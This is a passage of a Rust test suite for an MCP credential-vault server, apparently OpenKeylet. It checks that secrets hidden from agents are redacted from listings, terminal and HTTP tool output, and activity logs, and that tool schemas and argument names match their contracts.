use super::*;
use crate::model::{ConnectionInput, ItemModule, NamedSecrets, SecretBundle};
use tempfile::tempdir;

#[test]
fn old_and_new_secret_templates_can_be_mixed_without_recursive_substitution() {
    let input = "{{kru:password}}|{{openkeylet:token}}|{{kru:token}}";
    let replacements = HashMap::from([
        (
            "password".to_owned(),
            "secret-{{openkeylet:token}}".to_owned(),
        ),
        ("token".to_owned(), "token-value".to_owned()),
    ]);
    let mut modules = HashSet::new();
    collect_secret_placeholders_text(input, &mut modules).unwrap();
    assert_eq!(
        modules,
        HashSet::from(["password".to_owned(), "token".to_owned()])
    );
    let mut used = HashSet::new();
    assert_eq!(
        interpolate_http_text(input, &replacements, &mut used).unwrap(),
        "secret-{{openkeylet:token}}|token-value|token-value"
    );
    assert_eq!(used, modules);
    assert!(collect_secret_placeholders_text("{{kru:password}", &mut modules).is_err());
    assert!(interpolate_http_text("{{kru:missing}}", &replacements, &mut used).is_err());
}

fn structured_value(result: &CallToolResult) -> serde_json::Value {
    assert_eq!(result.is_error, Some(false));
    let structured = result.structured_content.clone().unwrap();
    let wire = serde_json::to_value(result).unwrap();
    let text = wire["content"][0]["text"].as_str().unwrap();
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(text).unwrap(),
        structured
    );
    structured
}

#[tokio::test]
async fn item_list_only_exposes_values_enabled_by_user() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let mut named = NamedSecrets::default();
    named.insert("username".into(), "mcp-visible-user-marker".into());
    named.insert("password".into(), "mcp-hidden-password-marker".into());
    named.insert("totp".into(), "JBSWY3DPEHPK3PXP".into());
    let mut secrets = SecretBundle::default();
    secrets.named_secrets = named;
    let saved = vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "username".into(),
                    name: String::new(),
                    value: String::new(),
                    agent_visible: Some(true),
                },
                ItemModule {
                    kind: "password".into(),
                    name: String::new(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
                ItemModule {
                    kind: "totp".into(),
                    name: String::new(),
                    value: String::new(),
                    agent_visible: Some(true),
                },
                ItemModule {
                    kind: "host".into(),
                    name: String::new(),
                    value: "ssh.example.test".into(),
                    agent_visible: Some(true),
                },
                ItemModule {
                    kind: "port".into(),
                    name: String::new(),
                    value: "22".into(),
                    agent_visible: Some(true),
                },
            ],
            name: "test login".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();

    let mcp = VaultMcp::new(vault.clone());
    let output = mcp
        .items_search(Parameters(ItemsSearchInput::default()))
        .await;
    let listed = structured_value(&output);
    let text = serde_json::to_string(&listed).unwrap();
    assert!(text.contains("username"));
    assert!(text.contains("password"));
    assert_eq!(
        listed["items"][0]["actions"],
        json!([
            "credential_fill",
            "ssh_run",
            "ssh_upload",
            "ssh_download",
            "http_send"
        ])
    );
    for removed in [
        "id",
        "type",
        "capabilities",
        "description",
        "fields",
        "target",
    ] {
        assert!(
            listed["items"][0].get(removed).is_none(),
            "legacy field {removed} remains"
        );
    }
    assert!(
        listed["items"][0]["modules"][0].get("secret").is_none(),
        "module output still exposes the removed secret projection"
    );
    assert!(text.contains("mcp-visible-user-marker"));
    assert!(!text.contains("mcp-hidden-password-marker"));
    assert!(!text.contains("JBSWY3DPEHPK3PXP"));
    assert_eq!(
        listed["items"][0]["modules"]
            .as_array()
            .unwrap()
            .iter()
            .find(|module| module["kind"] == "totp")
            .unwrap()["value"]
            .as_str()
            .unwrap()
            .len(),
        6
    );

    let exact = structured_value(
        &mcp.items_search(Parameters(ItemsSearchInput {
            query: Some("TEST LOGIN".into()),
        }))
        .await,
    );
    assert_eq!(exact["items"].as_array().unwrap().len(), 1);
    assert_eq!(exact["items"][0]["name"], "test login");

    let partial = structured_value(
        &mcp.items_search(Parameters(ItemsSearchInput {
            query: Some("login".into()),
        }))
        .await,
    );
    assert_eq!(partial["items"].as_array().unwrap().len(), 1);

    let natural_phrase = structured_value(
        &mcp.items_search(Parameters(ItemsSearchInput {
            query: Some("Use TEST_LOGIN in OpenKeylet MCP to finish signing in".into()),
        }))
        .await,
    );
    assert_eq!(natural_phrase["items"].as_array().unwrap().len(), 1);
    assert_eq!(natural_phrase["items"][0]["name"], "test login");
    assert_eq!(
        mcp.resolve_item_for_action(
            "Use TEST_LOGIN in OpenKeylet MCP to finish signing in",
            None,
        )
        .unwrap()
        .stored
        .name,
        "test login"
    );

    let mut api_named = NamedSecrets::default();
    api_named.insert("apiCredential".into(), "mcp-api-marker".into());
    let mut api_secrets = SecretBundle::default();
    api_secrets.named_secrets = api_named;
    let api_saved = vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "apiCredential".into(),
                    name: String::new(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
                ItemModule {
                    kind: "url".into(),
                    name: String::new(),
                    value: "https://example.test".into(),
                    agent_visible: Some(true),
                },
            ],
            name: "test login api".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: api_secrets,
        })
        .unwrap();
    assert_eq!(
        mcp.resolve_item_for_action("use test login api in OpenKeylet MCP", None)
            .unwrap()
            .stored
            .name,
        "test login api"
    );
    assert_eq!(
        mcp.resolve_item_for_action("use test login api in OpenKeylet MCP", Some("ssh"))
            .unwrap()
            .stored
            .name,
        "test login"
    );
    assert_eq!(
        mcp.resolve_item_for_action("", Some("http"))
            .unwrap()
            .stored
            .name,
        "test login"
    );
    assert_eq!(
        mcp.resolve_item_for_action("", None).unwrap().stored.name,
        "test login"
    );

    let selected = structured_value(
        &mcp.items_search(Parameters(ItemsSearchInput {
            query: Some("use test login in OpenKeylet MCP".into()),
        }))
        .await,
    );
    assert_eq!(selected["items"].as_array().unwrap().len(), 1);
    assert_eq!(
        mcp.resolve_item_for_action("", None).unwrap().stored.name,
        "test login"
    );

    let missing = structured_value(
        &mcp.items_search(Parameters(ItemsSearchInput {
            query: Some("does not exist".into()),
        }))
        .await,
    );
    assert!(missing["items"].as_array().unwrap().is_empty());
    assert!(mcp.resolve_item_for_action("", None).is_err());

    vault.set_connection_enabled(saved.id, false).unwrap();
    vault.set_connection_enabled(api_saved.id, false).unwrap();
    let hidden = VaultMcp::new(vault)
        .items_search(Parameters(ItemsSearchInput::default()))
        .await;
    let hidden = serde_json::to_string(&structured_value(&hidden)).unwrap();
    assert!(!hidden.contains("test login"));
    assert!(!hidden.contains("username"));
    assert!(!hidden.contains("password"));
}

#[test]
fn password_item_can_use_runtime_ssh_target_without_saved_target_modules() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let mut secrets = SecretBundle::default();
    secrets.password = Some("runtime-ssh-password-marker".into());
    let public = vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "Reusable SSH Secret".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();
    assert_eq!(public.capabilities, vec!["fill", "ssh", "http"]);
    assert!(!public.can_test);
    let mcp = VaultMcp::new(vault);

    let listed = mcp
        .search_items(ItemsSearchInput {
            query: Some("Reusable SSH Secret".into()),
        })
        .unwrap();
    assert_eq!(
        listed.items[0].actions,
        vec![
            "credential_fill",
            "ssh_run",
            "ssh_upload",
            "ssh_download",
            "http_send"
        ]
    );

    let connection = mcp
        .prepare_ssh_connection(
            "Reusable SSH Secret",
            Some("runtime.example.test"),
            None,
            Some("runtime-user"),
        )
        .unwrap();
    assert_eq!(connection.stored.host, "runtime.example.test");
    assert_eq!(connection.stored.port, 22);
    assert_eq!(connection.secrets.get("username"), Some("runtime-user"));
    assert_eq!(
        connection.secrets.get("password"),
        Some("runtime-ssh-password-marker")
    );
}

#[test]
fn http_secret_placeholders_cover_request_values_without_rescanning_secrets() {
    let mut input = serde_json::from_value::<HttpSendInput>(json!({
        "url": "https://example.test/{{openkeylet:token}}",
        "headers": {"X-Token": "Bearer {{openkeylet:token}}"},
        "query": {"token": "{{openkeylet:token}}", "nested": ["{{openkeylet:second}}"]},
        "body": {"credential": "{{openkeylet:token}}"},
        "form": {"credential": "prefix-{{openkeylet:second}}"}
    }))
    .unwrap();
    let replacements = HashMap::from([
        ("token".to_owned(), "value-{{openkeylet:second}}".to_owned()),
        ("second".to_owned(), "other-value".to_owned()),
    ]);

    assert_eq!(
        collect_http_secret_placeholders(&input).unwrap(),
        HashSet::from(["token".to_owned(), "second".to_owned()])
    );

    let used = interpolate_http_input(&mut input, &replacements).unwrap();

    assert_eq!(
        input.url,
        "https://example.test/value-{{openkeylet:second}}"
    );
    assert_eq!(
        input.headers["X-Token"],
        "Bearer value-{{openkeylet:second}}"
    );
    assert_eq!(input.query["token"], "value-{{openkeylet:second}}");
    assert_eq!(input.query["nested"][0], "other-value");
    assert_eq!(
        input.body.unwrap()["credential"],
        "value-{{openkeylet:second}}"
    );
    assert_eq!(input.form["credential"], "prefix-other-value");
    assert_eq!(
        used,
        HashSet::from(["token".to_owned(), "second".to_owned()])
    );

    let mut used = HashSet::new();
    assert!(
        interpolate_http_text("{{openkeylet:missing}}", &HashMap::new(), &mut used).is_err()
    );
    assert!(interpolate_http_text("{{openkeylet:token}", &replacements, &mut used).is_err());
}

#[tokio::test]
async fn http_send_uses_any_hidden_module_and_redacts_dynamic_totp() {
    type Seen = std::sync::Arc<std::sync::Mutex<Vec<String>>>;

    async fn echo(
        axum::extract::State(seen): axum::extract::State<Seen>,
        axum::extract::OriginalUri(uri): axum::extract::OriginalUri,
        headers: axum::http::HeaderMap,
        body: axum::body::Bytes,
    ) -> String {
        let otp = headers
            .get("x-openkeylet-otp")
            .and_then(|value| value.to_str().ok())
            .unwrap_or_default()
            .to_owned();
        let received = vec![
            otp,
            uri.to_string(),
            String::from_utf8_lossy(&body).into_owned(),
        ];
        *seen.lock().unwrap() = received.clone();
        received.join("|")
    }

    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let secret = "dynamic-http-secret-marker-7319";
    let totp_seed = "JBSWY3DPEHPK3PXP";
    let mut named = NamedSecrets::default();
    named.insert("service password".into(), secret.into());
    named.insert("totp".into(), totp_seed.into());
    let mut secrets = SecretBundle::default();
    secrets.named_secrets = named;
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "customSecret".into(),
                    name: "service password".into(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
                ItemModule {
                    kind: "totp".into(),
                    name: String::new(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
            ],
            name: "dynamic HTTP item".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();

    let seen = Seen::default();
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let address = listener.local_addr().unwrap();
    let application = axum::Router::new()
        .route("/echo/{secret}", axum::routing::post(echo))
        .with_state(seen.clone());
    let server = tokio::spawn(async move { axum::serve(listener, application).await });

    let mcp = VaultMcp::new(vault.clone());
    let listed = structured_value(
        &mcp.items_search(Parameters(ItemsSearchInput {
            query: Some("dynamic HTTP item".into()),
        }))
        .await,
    );
    assert_eq!(
        listed["items"][0]["actions"],
        json!(["credential_fill", "http_send"])
    );

    let request = serde_json::from_value::<HttpSendInput>(json!({
        "item": "dynamic HTTP item",
        "url": format!("http://{address}/echo/{{{{openkeylet:auth}}}}"),
        "method": "POST",
        "headers": {"X-OpenKeylet-Otp": "{{openkeylet:otp}}"},
        "query": {"credential": "{{openkeylet:auth}}"},
        "body": {"credential": "{{openkeylet:auth}}"},
        "secretBindings": {
            "auth": "service password",
            "otp": "totp",
            "unused": "service password"
        }
    }))
    .unwrap();
    let result = structured_value(&mcp.http_send(Parameters(request)).await);
    let output = serde_json::to_string(&result).unwrap();
    let received = seen.lock().unwrap().clone();
    let otp = &received[0];

    assert_eq!(otp.len(), 6);
    assert!(otp.chars().all(|character| character.is_ascii_digit()));
    assert_ne!(otp, totp_seed);
    assert!(received[1].contains(secret));
    assert!(received[2].contains(secret));
    assert!(output.contains("[REDACTED]"));
    assert!(!output.contains(secret));
    assert!(!output.contains(totp_seed));
    assert!(!output.contains(otp));

    let direct_request = serde_json::from_value::<HttpSendInput>(json!({
        "item": "dynamic HTTP item",
        "url": format!("http://{address}/echo/{{{{openkeylet:service password}}}}"),
        "method": "POST",
        "headers": {"X-OpenKeylet-Otp": "{{openkeylet:totp}}"},
        "query": {"credential": "{{openkeylet:service password}}"},
        "body": {"credential": "{{openkeylet:service password}}"}
    }))
    .unwrap();
    let direct_result = structured_value(&mcp.http_send(Parameters(direct_request)).await);
    let direct_output = serde_json::to_string(&direct_result).unwrap();
    let direct_received = seen.lock().unwrap().clone();
    let direct_otp = &direct_received[0];

    assert_eq!(direct_otp.len(), 6);
    assert!(
        direct_otp
            .chars()
            .all(|character| character.is_ascii_digit())
    );
    assert_ne!(direct_otp, totp_seed);
    assert!(direct_received[1].contains(secret));
    assert!(direct_received[2].contains(secret));
    assert!(direct_output.contains("[REDACTED]"));
    assert!(!direct_output.contains(secret));
    assert!(!direct_output.contains(totp_seed));
    assert!(!direct_output.contains(direct_otp));

    let plain_request = serde_json::from_value::<HttpSendInput>(json!({
        "item": "dynamic HTTP item",
        "url": format!("http://{address}/echo/plain"),
        "method": "POST",
        "body": {"ping": true}
    }))
    .unwrap();
    let plain_result = structured_value(&mcp.http_send(Parameters(plain_request)).await);
    assert_eq!(plain_result["status"], 200);
    assert!(plain_result["body"].as_str().unwrap().contains("plain"));

    let activities = serde_json::to_string(&vault.activities().unwrap()).unwrap();
    assert!(activities.contains("[REDACTED]"));
    assert!(!activities.contains(secret));
    assert!(!activities.contains(totp_seed));
    assert!(!activities.contains(otp));
    server.abort();
}

#[tokio::test]
async fn credential_fill_infers_single_secret_and_terminal_target() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let mut secrets = SecretBundle::default();
    secrets.password = Some("single-secret-terminal-marker".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                name: String::new(),
                value: String::new(),
                agent_visible: Some(false),
            }],
            name: "single secret".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();

    let mcp = VaultMcp::new(vault);
    #[cfg(windows)]
    let (program, args) = ("cmd.exe", vec!["/Q".to_owned()]);
    #[cfg(not(windows))]
    let (program, args) = ("/bin/sh", Vec::new());
    let terminal = mcp.terminal.open(program, args, None).unwrap();
    mcp.bind_active_terminal(terminal.session_id);
    let output = mcp
        .credential_fill(Parameters(CredentialFillInput {
            item: String::new(),
            module: String::new(),
            target: String::new(),
            session_id: None,
            submit: false,
            ..Default::default()
        }))
        .await;
    let filled = structured_value(&output);
    assert_eq!(filled["module"], "password");
    assert_eq!(filled["target"], "terminal");
    assert_eq!(filled["submitted"], false);
    assert!(
        !serde_json::to_string(&filled)
            .unwrap()
            .contains("single-secret-terminal-marker")
    );
    mcp.terminal.close(terminal.session_id).unwrap();
}

#[tokio::test]
async fn credential_fill_resolves_module_and_target_from_common_phrases() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let mut named = NamedSecrets::default();
    named.insert("username".into(), "natural-user-marker".into());
    named.insert("password".into(), "natural-password-marker".into());
    let mut secrets = SecretBundle::default();
    secrets.named_secrets = named;
    let saved = vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![
                ItemModule {
                    kind: "username".into(),
                    name: String::new(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
                ItemModule {
                    kind: "password".into(),
                    name: String::new(),
                    value: String::new(),
                    agent_visible: Some(false),
                },
            ],
            name: "multi login".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();

    let connection = vault.get_connection(saved.id).unwrap();
    assert_eq!(
        resolve_secret_module(&connection, "user name", "").unwrap(),
        "username"
    );
    assert!(resolve_secret_module(&connection, "", "multi login").is_err());

    let mcp = VaultMcp::new(vault);
    #[cfg(windows)]
    let (program, args) = ("cmd.exe", vec!["/Q".to_owned()]);
    #[cfg(not(windows))]
    let (program, args) = ("/bin/sh", Vec::new());
    let terminal = mcp.terminal.open(program, args, None).unwrap();
    let output = mcp
        .credential_fill(Parameters(CredentialFillInput {
            item: "use the password from multi login in OpenKeylet MCP".into(),
            module: String::new(),
            target: "PTY".into(),
            session_id: Some(terminal.session_id.to_string()),
            submit: false,
            ..Default::default()
        }))
        .await;
    let filled = structured_value(&output);
    assert_eq!(filled["module"], "password");
    assert_eq!(filled["target"], "terminal");
    assert!(
        !serde_json::to_string(&filled)
            .unwrap()
            .contains("natural-password-marker")
    );
    mcp.terminal.close(terminal.session_id).unwrap();
}

#[tokio::test]
async fn terminal_start_without_program_opens_the_platform_shell() {
    let directory = tempdir().unwrap();
    let mcp = VaultMcp::new(Vault::open(directory.path().join("vault")).unwrap());
    let output = mcp
        .terminal_start(Parameters(TerminalStartInput {
            item: String::new(),
            program: String::new(),
            args: Vec::new(),
            cwd: None,
            command: String::new(),
            secret_env: HashMap::new(),
        }))
        .await;
    let opened = structured_value(&output);
    let session_id = Uuid::parse_str(opened["sessionId"].as_str().unwrap()).unwrap();
    assert!(!opened["executable"].as_str().unwrap().is_empty());
    #[cfg(windows)]
    assert!(
        opened["executable"]
            .as_str()
            .unwrap()
            .to_ascii_lowercase()
            .ends_with("powershell.exe")
    );
    let stopped = mcp
        .terminal_stop(Parameters(TerminalSessionInput {
            session_id: String::new(),
        }))
        .await;
    assert_ne!(stopped.is_error, Some(true));
    assert!(!mcp.terminal.contains(session_id).unwrap());
}

#[tokio::test]
async fn terminal_start_can_submit_first_command_and_read_can_wait() {
    let directory = tempdir().unwrap();
    let mcp = VaultMcp::new(Vault::open(directory.path().join("vault")).unwrap());
    #[cfg(windows)]
    let (program, args) = ("cmd.exe".to_owned(), vec!["/D".to_owned(), "/Q".to_owned()]);
    #[cfg(not(windows))]
    let (program, args) = (
        "/bin/sh".to_owned(),
        vec![
            "-c".to_owned(),
            "sleep 0.3; IFS= read -r line; printf '%s' \"$line\"".to_owned(),
        ],
    );
    let opened = structured_value(
        &mcp.terminal_start(Parameters(TerminalStartInput {
            item: String::new(),
            program,
            args,
            cwd: None,
            command: if cfg!(windows) {
                "echo OPENKEYLET_INITIAL_COMMAND_MARKER".to_owned()
            } else {
                "OPENKEYLET_INITIAL_COMMAND_MARKER".to_owned()
            },
            secret_env: HashMap::new(),
        }))
        .await,
    );
    let session_id = opened["sessionId"].as_str().unwrap().to_owned();
    let read = structured_value(
        &mcp.terminal_read(Parameters(TerminalReadInput {
            session_id: String::new(),
            wait_seconds: Some(10),
            until: Some("OPENKEYLET_INITIAL_COMMAND_MARKER".into()),
        }))
        .await,
    );
    assert!(
        read["output"]
            .as_str()
            .unwrap()
            .contains("OPENKEYLET_INITIAL_COMMAND_MARKER")
    );
    mcp.terminal
        .close(Uuid::parse_str(&session_id).unwrap())
        .unwrap();
}

#[tokio::test]
async fn terminal_start_injects_and_redacts_hidden_environment_modules() {
    let directory = tempdir().unwrap();
    let vault = Vault::open(directory.path().join("vault")).unwrap();
    let secret = "terminal secret ' with spaces $ marker-7391";
    let mut secrets = SecretBundle::default();
    secrets.password = Some(secret.to_owned());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "CLI Login".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets,
        })
        .unwrap();
    let mut other_secrets = SecretBundle::default();
    other_secrets.password = Some("other-terminal-secret-marker".into());
    vault
        .save_connection(ConnectionInput {
            login_uris: Vec::new(),
            item_type: String::new(),
            folder: String::new(),
            favorite: false,
            id: None,
            modules: vec![ItemModule {
                kind: "password".into(),
                agent_visible: Some(false),
                ..Default::default()
            }],
            name: "Other CLI Login".into(),
            enabled: true,
            description: String::new(),
            http_auth_type: String::new(),
            private_key_import_path: String::new(),
            auth_header: String::new(),
            auth_location: String::new(),
            auth_prefix: String::new(),
            api_auth_headers: vec![],
            test_path: String::new(),
            remove_secret_names: vec![],
            secrets: other_secrets,
        })
        .unwrap();
    let mcp = VaultMcp::new(vault);
    #[cfg(windows)]
    let one_shot_command = "$openkeyletInput=[Console]::In.ReadToEnd(); Write-Output {{openkeylet:password}}; Write-Output $openkeyletInput; [Console]::Error.WriteLine($env:OPENKEYLET_HIDDEN_ENV)";
    #[cfg(not(windows))]
    let one_shot_command = "printf '%s\n' {{openkeylet:password}}; cat; printf '%s\n' \"$OPENKEYLET_HIDDEN_ENV\" >&2";
    let one_shot = structured_value(
        &mcp.terminal_run(Parameters(TerminalRunInput {
            item: "use CLI Login in OpenKeylet MCP".into(),
            command: one_shot_command.into(),
            stdin: Some("stdin={{openkeylet:password}}".into()),
            cwd: None,
            timeout_seconds: Some(10),
            secret_env: HashMap::from([("OPENKEYLET_HIDDEN_ENV".into(), "password".into())]),
            max_output_bytes: None,
        }))
        .await,
    );
    assert_eq!(one_shot["exitCode"], 0);
    assert!(one_shot["stdout"].as_str().unwrap().contains("[REDACTED]"));
    assert!(one_shot["stderr"].as_str().unwrap().contains("[REDACTED]"));
    assert!(!one_shot.to_string().contains(secret));

    #[cfg(windows)]
    let (program, args) = (
        "powershell.exe".to_owned(),
        vec![
            "-NoProfile".to_owned(),
            "-Command".to_owned(),
            "[Console]::Write($env:OPENKEYLET_HIDDEN_ENV)".to_owned(),
        ],
    );
    #[cfg(not(windows))]
    let (program, args) = (
        "/bin/sh".to_owned(),
        vec![
            "-c".to_owned(),
            "printf '%s' \"$OPENKEYLET_HIDDEN_ENV\"".to_owned(),
        ],
    );
    let opened = structured_value(
        &mcp.terminal_start(Parameters(TerminalStartInput {
            item: "use CLI Login in OpenKeylet MCP".into(),
            program,
            args,
            cwd: None,
            command: String::new(),
            secret_env: HashMap::from([("OPENKEYLET_HIDDEN_ENV".into(), "password".into())]),
        }))
        .await,
    );
    assert!(!opened.to_string().contains(secret));
    let session_id = opened["sessionId"].as_str().unwrap().to_owned();
    let read = structured_value(
        &mcp.terminal_read(Parameters(TerminalReadInput {
            session_id: session_id.clone(),
            wait_seconds: Some(6),
            until: Some("[REDACTED]".into()),
        }))
        .await,
    );
    let terminal_output = read["output"].as_str().unwrap();
    assert!(terminal_output.contains("[REDACTED]"));
    assert!(!terminal_output.contains(secret));
    mcp.terminal
        .close(Uuid::parse_str(&session_id).unwrap())
        .unwrap();

    #[cfg(windows)]
    let direct_command = "Write-Output {{openkeylet:password}}; exit";
    #[cfg(not(windows))]
    let direct_command = "printf '%s\\n' {{openkeylet:password}}; exit";
    let direct = structured_value(
        &mcp.terminal_start(Parameters(TerminalStartInput {
            item: "use CLI Login in OpenKeylet MCP".into(),
            program: String::new(),
            args: Vec::new(),
            cwd: None,
            command: direct_command.into(),
            secret_env: HashMap::new(),
        }))
        .await,
    );
    assert!(!direct.to_string().contains(secret));
    let direct_session_id = direct["sessionId"].as_str().unwrap().to_owned();
    let direct_read = structured_value(
        &mcp.terminal_read(Parameters(TerminalReadInput {
            session_id: direct_session_id.clone(),
            wait_seconds: Some(10),
            until: Some("[REDACTED]".into()),
        }))
        .await,
    );
    let direct_output = direct_read["output"].as_str().unwrap();
    assert!(!direct_output.contains(secret));
    assert!(direct_output.contains("[REDACTED]"));
    mcp.terminal
        .close(Uuid::parse_str(&direct_session_id).unwrap())
        .unwrap();

    #[cfg(windows)]
    let (interactive_program, interactive_args, interactive_text) = (
        "powershell.exe".to_owned(),
        vec![
            "-NoProfile".to_owned(),
            "-Command".to_owned(),
            "Start-Sleep -Milliseconds 300; [Console]::ReadLine() | Write-Output".to_owned(),
        ],
        "{{openkeylet:password}}".to_owned(),
    );
    #[cfg(not(windows))]
    let (interactive_program, interactive_args, interactive_text) = (
        "/bin/sh".to_owned(),
        vec![
            "-c".to_owned(),
            "sleep 0.3; IFS= read -r line; printf '%s' \"$line\"".to_owned(),
        ],
        "{{openkeylet:password}}".to_owned(),
    );
    let interactive = structured_value(
        &mcp.terminal_start(Parameters(TerminalStartInput {
            item: "use CLI Login in OpenKeylet MCP".into(),
            program: interactive_program,
            args: interactive_args,
            cwd: None,
            command: String::new(),
            secret_env: HashMap::new(),
        }))
        .await,
    );
    let interactive_session_id = interactive["sessionId"].as_str().unwrap().to_owned();
    let written = mcp
        .terminal_write(Parameters(TerminalWriteInput {
            item: String::new(),
            session_id: String::new(),
            text: interactive_text,
            submit: true,
        }))
        .await;
    assert_ne!(written.is_error, Some(true));
    assert!(!serde_json::to_string(&written).unwrap().contains(secret));
    let interactive_read = structured_value(
        &mcp.terminal_read(Parameters(TerminalReadInput {
            session_id: String::new(),
            wait_seconds: Some(5),
            until: Some("[REDACTED]".into()),
        }))
        .await,
    );
    let interactive_output = interactive_read["output"].as_str().unwrap();
    assert!(!interactive_output.contains(secret));
    assert!(interactive_output.contains("[REDACTED]"));
    let stopped = mcp
        .terminal_stop(Parameters(TerminalSessionInput {
            session_id: String::new(),
        }))
        .await;
    assert_ne!(stopped.is_error, Some(true));
    let interactive_id = Uuid::parse_str(&interactive_session_id).unwrap();
    assert!(
        !mcp.terminal_items
            .read()
            .unwrap()
            .contains_key(&interactive_id)
    );
}

#[test]
fn tool_contracts_have_output_schemas_and_annotations() {
    let router = VaultMcp::tool_router();
    let expected = [
        ("items_search", true, false, true, false),
        ("credential_fill", false, false, false, true),
        ("terminal_run", false, true, false, true),
        ("terminal_start", false, false, false, true),
        ("terminal_write", false, true, false, true),
        ("terminal_read", true, false, false, false),
        ("terminal_stop", false, true, true, false),
        ("ssh_run", false, true, false, true),
        ("ssh_upload", false, true, false, true),
        ("ssh_download", false, true, false, true),
        ("http_send", false, true, false, true),
    ];
    for (name, read_only, destructive, idempotent, open_world) in expected {
        let tool = router.get(name).unwrap();
        assert!(
            tool.output_schema.is_some(),
            "{name} needs an output schema"
        );
        let annotations = tool.annotations.as_ref().unwrap();
        assert_eq!(annotations.read_only_hint, Some(read_only), "{name}");
        assert_eq!(annotations.destructive_hint, Some(destructive), "{name}");
        assert_eq!(annotations.idempotent_hint, Some(idempotent), "{name}");
        assert_eq!(annotations.open_world_hint, Some(open_world), "{name}");
    }
    for removed in [
        "vault_items_list",
        "secret_fill",
        "terminal_open",
        "terminal_input",
        "terminal_close",
        "ssh_execute",
        "api_request",
    ] {
        assert!(
            router.get(removed).is_none(),
            "removed tool {removed} is still registered"
        );
    }
}

#[test]
fn renamed_arguments_are_rejected() {
    assert!(
        serde_json::from_value::<CredentialFillInput>(json!({
            "item": "test login",
            "field": "password",
            "target": "browser"
        }))
        .is_err()
    );
    assert!(
        serde_json::from_value::<SshRunInput>(json!({
            "connectionId": Uuid::new_v4().to_string(),
            "command": "hostname"
        }))
        .is_err()
    );
    assert!(
        serde_json::from_value::<HttpSendInput>(json!({
            "itemId": Uuid::new_v4().to_string(),
            "url": "https://api.example.test/v1/health",
            "path": "health"
        }))
        .is_err()
    );
}

#[test]
fn low_friction_defaults_submit_only_when_requested_and_replace_transfer_targets() {
    let shell = serde_json::from_value::<TerminalStartInput>(json!({})).unwrap();
    assert!(shell.program.is_empty());
    assert!(shell.args.is_empty());
    assert!(shell.cwd.is_none());
    assert!(shell.command.is_empty());
    assert!(shell.item.is_empty());
    assert!(shell.secret_env.is_empty());

    let inferred_fill = serde_json::from_value::<CredentialFillInput>(json!({})).unwrap();
    assert!(inferred_fill.item.is_empty());
    assert!(inferred_fill.module.is_empty());
    assert!(inferred_fill.target.is_empty());
    assert!(inferred_fill.session_id.is_none());
    assert!(!inferred_fill.submit);

